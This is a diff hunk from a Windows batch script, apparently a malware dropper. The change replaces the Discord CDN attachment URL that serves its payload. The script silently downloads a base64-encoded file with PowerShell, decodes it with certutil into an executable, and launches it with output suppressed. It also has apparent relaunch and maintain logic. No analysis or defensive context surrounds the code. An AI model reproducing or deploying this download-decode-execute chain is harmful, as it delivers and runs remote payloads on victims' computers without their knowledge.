@@ -17,7 +17,7 @@ if "%ERRORLEVEL%"=="1" Start %AVLOPATH%
 
 :CREATE
 if not exist "%AVLOPATH%" (
-    >nul powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/950495650284462090/963534978216493116/Encoded.txt', '%TEMP%\b64dropA')
+    >nul powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/961721033105211422/964177849386954772/lol1111.txt', '%TEMP%\b64dropA')
     certutil -decode "%TEMP%\b64dropA" "%AVLOPATH%"
     start %AVLOPATH% >nul 2>&1
     goto MAINTAIN
